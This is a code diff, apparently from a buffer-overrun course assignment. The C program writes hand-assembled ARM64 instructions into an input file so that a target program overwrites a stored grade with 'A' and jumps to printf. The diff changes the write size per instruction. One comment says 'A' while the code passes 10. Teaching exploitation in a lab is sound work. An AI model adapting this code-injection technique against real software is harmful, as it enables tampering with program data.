@@ -27,19 +27,19 @@ int main(void){
 
    /* mov w0, 'A'   */
    ulInstruction = MiniAssembler_mov(0, 10);
-   fwrite(&ulInstruction, sizeof(unsigned long), 1, psFile);
+   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* adr x1, grade */
    ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 8 + 4);
-   fwrite(&ulInstruction, sizeof(unsigned long), 1, psFile);
+   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* strb wo, [x1] */
    ulInstruction = MiniAssembler_strb(0, 1);
-   fwrite(&ulInstruction, sizeof(unsigned long), 1, psFile);
+   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* b  printf     */
    ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 8 + 12);
-   fwrite(&ulInstruction, sizeof(unsigned long), 1, psFile);
+   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
 
    /* Writes the null byte at the end of the instructions */
